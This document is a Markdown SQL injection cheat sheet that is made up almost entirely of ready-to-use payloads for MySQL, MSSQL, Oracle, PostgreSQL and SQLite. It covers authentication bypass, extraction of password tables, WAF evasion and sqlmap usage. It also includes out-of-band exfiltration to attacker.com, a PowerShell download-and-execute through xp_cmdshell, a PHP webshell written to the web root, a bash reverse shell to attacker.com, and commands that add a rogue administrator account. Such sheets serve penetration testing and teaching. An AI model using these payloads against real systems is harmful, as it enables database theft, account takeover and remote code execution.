# SQL Injection (SQLi)

> SQL Injection occurs when user-supplied input is inserted into an SQL query without proper sanitization, allowing attackers to manipulate the query logic, extract data, bypass authentication, or execute commands on the database server.

---

## Table of Contents

- [Detection](#detection)
- [Types of SQL Injection](#types-of-sql-injection)
- [Authentication Bypass](#authentication-bypass)
- [Union-Based Injection](#union-based-injection)
- [Error-Based Injection](#error-based-injection)
- [Blind Boolean-Based Injection](#blind-boolean-based-injection)
- [Blind Time-Based Injection](#blind-time-based-injection)
- [Out-of-Band Injection](#out-of-band-injection)
- [Stacked Queries](#stacked-queries)
- [Second Order Injection](#second-order-injection)
- [Database Fingerprinting](#database-fingerprinting)
- [MySQL](#mysql)
- [Microsoft SQL Server (MSSQL)](#microsoft-sql-server-mssql)
- [Oracle](#oracle)
- [PostgreSQL](#postgresql)
- [SQLite](#sqlite)
- [WAF Bypass Techniques](#waf-bypass-techniques)
- [Automated Tools](#automated-tools)
- [References](#references)

---

## Detection

### Basic Probes

```sql
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
" OR 1=1--
;--
'--
' #
/*
/*!
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--
```

### Error Triggering Payloads

```sql
'
\'
1'
1"
1`
1)
1')
1")
1`)
((1
```

### Confirm Vulnerability

```sql
' AND '1'='1          -- True condition (same result as normal)
' AND '1'='2          -- False condition (different result)
' AND 1=1--           -- True
' AND 1=2--           -- False
1 AND SLEEP(5)--      -- Time-based confirmation
```

---

## Types of SQL Injection

| Type | Description | Visibility |
|---|---|---|
| **In-band: Union** | Uses UNION to extract data in response | Data returned in page |
| **In-band: Error** | Triggers DB errors that leak data | Error messages visible |
| **Blind: Boolean** | True/False responses reveal data bit by bit | Page behavior differs |
| **Blind: Time** | DB delay (SLEEP/WAITFOR) confirms injection | No visible difference |
| **Out-of-Band** | Data exfiltrated via DNS/HTTP requests | Requires outbound access |
| **Second Order** | Payload stored, triggered later | Delayed execution |

---

## Authentication Bypass

```sql
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
' OR 1=1--
' OR 1=1#
' OR 1=1/*
admin'--
admin' #
admin'/*
' OR 'x'='x
') OR ('x'='x
' OR 1=1 LIMIT 1--
'=''OR'
' OR ''='
1' OR '1'='1'--
anything' OR 'x'='x

-- Username: admin'--   Password: anything
-- Username: ' OR 1=1-- Password: anything
-- Username: admin'#    Password: anything
```

### Bypass with Comments

```sql
admin'/*comment*/--
ad/**/min'--
' OR/**/1=1--
```

---

## Union-Based Injection

### Step 1 — Find Number of Columns

```sql
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
-- Increment until error; column count = last working number

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Step 2 — Find Printable Columns

```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

### Step 3 — Extract Data

```sql
-- Extract database version
' UNION SELECT NULL,@@version,NULL--

-- Extract all tables (MySQL)
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--

-- Extract columns of a table
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Extract data
' UNION SELECT NULL,username,password FROM users--

-- Concatenate multiple columns
' UNION SELECT NULL,concat(username,':',password),NULL FROM users--
```

---

## Error-Based Injection

### MySQL

```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### MSSQL

```sql
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND 1=CONVERT(int,@@version)--
```

### Oracle

```sql
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
' OR 1=1 AND ROWNUM=1--
```

### PostgreSQL

```sql
' AND CAST(version() AS int)--
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
```

---

## Blind Boolean-Based Injection

### Confirm Boolean Behavior

```sql
' AND 1=1--    -- True  → normal page
' AND 1=2--    -- False → different page
```

### Extract Data Character by Character

```sql
-- MySQL: extract first character of database name
' AND SUBSTRING(database(),1,1)='a'--
' AND SUBSTRING(database(),1,1)='b'--

-- ASCII comparison (more reliable)
' AND ASCII(SUBSTRING(database(),1,1))>97--
' AND ASCII(SUBSTRING(database(),1,1))=109--

-- Extract username from users table
' AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a'--

-- MSSQL
' AND SUBSTRING((SELECT TOP 1 username FROM users),1,1)='a'--

-- Oracle
' AND SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)='a'--
```

---

## Blind Time-Based Injection

### MySQL

```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
' AND IF(ASCII(SUBSTRING(database(),1,1))=109,SLEEP(5),0)--
```

### MSSQL

```sql
'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (SUBSTRING(db_name(),1,1)='m') WAITFOR DELAY '0:0:5'--
```

### Oracle

```sql
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' OR 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--
```

### PostgreSQL

```sql
'; SELECT pg_sleep(5)--
' AND 1=(SELECT 1 FROM pg_sleep(5))--
' OR 1=1 AND (SELECT 1 FROM pg_sleep(5))=1--
```

### SQLite

```sql
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--
```

---

## Out-of-Band Injection

### MySQL — DNS Exfiltration

```sql
' AND LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\share\\'))--
' UNION SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,(SELECT database()),0x2e61747461636b65722e636f6d5c5c61))--
```

### MSSQL — DNS Exfiltration

```sql
'; exec master..xp_dirtree '\\attacker.com\a'--
'; declare @q varchar(1024);set @q='\\'+@@version+'.attacker.com\a';exec master..xp_dirtree @q--
```

### Oracle — HTTP Exfiltration

```sql
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1)) FROM dual--
```

### PostgreSQL — DNS/HTTP

```sql
'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/?v='||version()--
```

---

## Stacked Queries

> Supported by: MSSQL, PostgreSQL, SQLite. MySQL supports it in some configurations.

```sql
-- MSSQL: Execute system command
'; EXEC xp_cmdshell('whoami')--
'; EXEC xp_cmdshell('powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/shell.ps1'')"')--

-- Enable xp_cmdshell (if disabled)
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--

-- PostgreSQL: Copy to/from file
'; COPY users TO '/tmp/out.txt'--
'; COPY (SELECT version()) TO '/tmp/ver.txt'--

-- MySQL: Write file
'; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
```

---

## Second Order Injection

> Payload is stored in the database and triggered when retrieved and used in another query.

```sql
-- Registration step (stored safely):
Username: admin'--

-- Login / profile update step (vulnerable query uses stored value):
SELECT * FROM users WHERE username='admin'--' AND password='...'
-- The -- comments out the password check → authentication bypass
```

---

## Database Fingerprinting

### Version Detection

| Database | Payload | Example Output |
|---|---|---|
| MySQL | `SELECT @@version` | `8.0.33` |
| MSSQL | `SELECT @@version` | `Microsoft SQL Server 2019` |
| Oracle | `SELECT banner FROM v$version` | `Oracle Database 19c` |
| PostgreSQL | `SELECT version()` | `PostgreSQL 15.2` |
| SQLite | `SELECT sqlite_version()` | `3.42.0` |

### Current User / DB

```sql
-- MySQL
SELECT user(), database(), @@datadir;

-- MSSQL
SELECT system_user, db_name(), @@servername;

-- Oracle
SELECT user FROM dual;

-- PostgreSQL
SELECT current_user, current_database();

-- SQLite
SELECT sqlite_version();
```

---

## MySQL

### Enumerate Databases

```sql
SELECT schema_name FROM information_schema.schemata;
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--
```

### Enumerate Tables

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema=database();
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
```

### Enumerate Columns

```sql
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```

### Read Files

```sql
SELECT LOAD_FILE('/etc/passwd');
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--
```

### Write Files (Webshell)

```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--
```

### Useful MySQL Functions

```sql
GROUP_CONCAT(username,':',password)         -- Concatenate multiple rows
HEX('string')                               -- Encode string to hex
UNHEX('hex')                                -- Decode hex
CHAR(65,66,67)                              -- Returns 'ABC'
ASCII('A')                                  -- Returns 65
```

---

## Microsoft SQL Server (MSSQL)

### Enumerate Databases

```sql
SELECT name FROM master..sysdatabases;
' UNION SELECT NULL,name,NULL FROM master..sysdatabases--
```

### Enumerate Tables

```sql
SELECT table_name FROM information_schema.tables;
SELECT name FROM sysobjects WHERE xtype='U';
```

### Enumerate Columns

```sql
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```

### OS Command Execution

```sql
EXEC xp_cmdshell('whoami');
EXEC xp_cmdshell('net user hacker P@ssw0rd /add');
EXEC xp_cmdshell('net localgroup administrators hacker /add');
```

### Enable xp_cmdshell

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### Read Files

```sql
BULK INSERT temp FROM 'C:\Windows\System32\drivers\etc\hosts';
EXEC xp_cmdshell('type C:\Windows\win.ini');
```

### Linked Servers

```sql
SELECT * FROM OPENROWSET('SQLNCLI','Server=attacker.com;Trusted_Connection=yes;','SELECT 1');
```

---

## Oracle

### Enumerate Tables

```sql
SELECT table_name FROM all_tables;
SELECT table_name FROM user_tables;
' UNION SELECT NULL,table_name,NULL FROM all_tables--
```

### Enumerate Columns

```sql
SELECT column_name FROM all_columns WHERE table_name='USERS';
```

### Extract Data

```sql
' UNION SELECT NULL,username||':'||password,NULL FROM users--
```

### Oracle-Specific Syntax

```sql
-- Oracle requires FROM dual for SELECT without a table
SELECT 1 FROM dual;
SELECT banner FROM v$version WHERE rownum=1;
SELECT user FROM dual;
```

### XXE via Oracle XML DB (RCE)

```sql
SELECT XMLType(httpuritype('http://attacker.com/'||(SELECT user FROM dual)).getclob()) FROM dual;
```

---

## PostgreSQL

### Enumerate Databases

```sql
SELECT datname FROM pg_database;
' UNION SELECT NULL,datname,NULL FROM pg_database--
```

### Enumerate Tables

```sql
SELECT tablename FROM pg_tables WHERE schemaname='public';
```

### Enumerate Columns

```sql
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```

### OS Command Execution

```sql
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;

-- Using COPY for reverse shell
COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/attacker.com/4444 0>&1';
```

### Read Files

```sql
COPY users FROM '/etc/passwd';
SELECT pg_read_file('/etc/passwd', 0, 1000000);
```

### Large Object Trick

```sql
SELECT lo_import('/etc/passwd');
SELECT lo_get(16395);
```

---

## SQLite

### Enumerate Tables

```sql
SELECT name FROM sqlite_master WHERE type='table';
' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='table'--
```

### Enumerate Columns

```sql
SELECT sql FROM sqlite_master WHERE type='table' AND name='users';
```

### Extract Data

```sql
' UNION SELECT NULL,username||':'||password,NULL FROM users--
```

### SQLite-Specific Functions

```sql
sqlite_version()
hex()
substr()
randomblob()
```

---

## WAF Bypass Techniques

### Case Manipulation

```sql
sElEcT * fRoM uSeRs
UNION/**/SELECT
```

### Comment Injection

```sql
UN/**/ION SEL/**/ECT
/*!UNION*/ /*!SELECT*/
UN/*!50000ION*/ SEL/*!50000ECT*/
```

### Whitespace Substitution

```sql
UNION%09SELECT          -- Tab
UNION%0ASELECT          -- Newline
UNION%0DSELECT          -- Carriage return
UNION%A0SELECT          -- Non-breaking space
UNION(SELECT)
```

### Encoding

```sql
-- URL Encoding
%27 = '
%20 = space
%23 = #

-- Double URL Encoding
%2527 = %27 = '

-- Unicode
ʼ (U+02BC)  →  similar to apostrophe
```

### Keyword Bypass

```sql
-- Replace UNION SELECT
UNION ALL SELECT
UNION DISTINCT SELECT

-- Replace OR
|| (in Oracle/PostgreSQL)
OORR (if filter strips OR)

-- Replace =
LIKE
REGEXP
BETWEEN 0 AND 0
```

### Scientific Notation (MySQL)

```sql
SELECT 1e0UNION SELECT...
SELECT .1UNION SELECT...
```

### HTTP Parameter Pollution

```
?id=1&id=' UNION SELECT...
```

### Nested Comments (MySQL)

```sql
/*!50000 UNION*/ /*!50000 SELECT*/
```

---

## Automated Tools

### SQLMap

```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# POST request
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Specify DB type
sqlmap -u "http://target.com/page?id=1" --dbms=mysql

# Dump all databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Dump specific table
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# Bypass WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between,randomcase

# Use cookie
sqlmap -u "http://target.com/page" --cookie="session=abc123" -p id

# Increase level and risk
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3

# HTTP header injection
sqlmap -u "http://target.com/" --headers="X-Forwarded-For: *"
```

### Common SQLMap Tamper Scripts

| Tamper | Description |
|---|---|
| `space2comment` | Replaces spaces with `/**/` |
| `between` | Replaces `>` with `NOT BETWEEN 0 AND` |
| `randomcase` | Randomizes keyword casing |
| `charunicodeencode` | Unicode-encodes characters |
| `base64encode` | Base64 encodes payload |
| `equaltolike` | Replaces `=` with `LIKE` |
| `unmagicquotes` | Bypasses magic_quotes with GBK encoding |

---

## References

- OWASP SQL Injection Prevention Cheat Sheet
- PortSwigger Web Security Academy — SQL Injection
- HackTricks — SQLi
- PayloadsAllTheThings — SQL Injection
- Database Docs:
  - [MySQL Reference Manual](https://dev.mysql.com/doc/)
  - [MSSQL Docs](https://docs.microsoft.com/en-us/sql/)
  - [PostgreSQL Docs](https://www.postgresql.org/docs/)
  - [Oracle Database Docs](https://docs.oracle.com/en/database/)
  - [SQLite Docs](https://www.sqlite.org/docs.html)
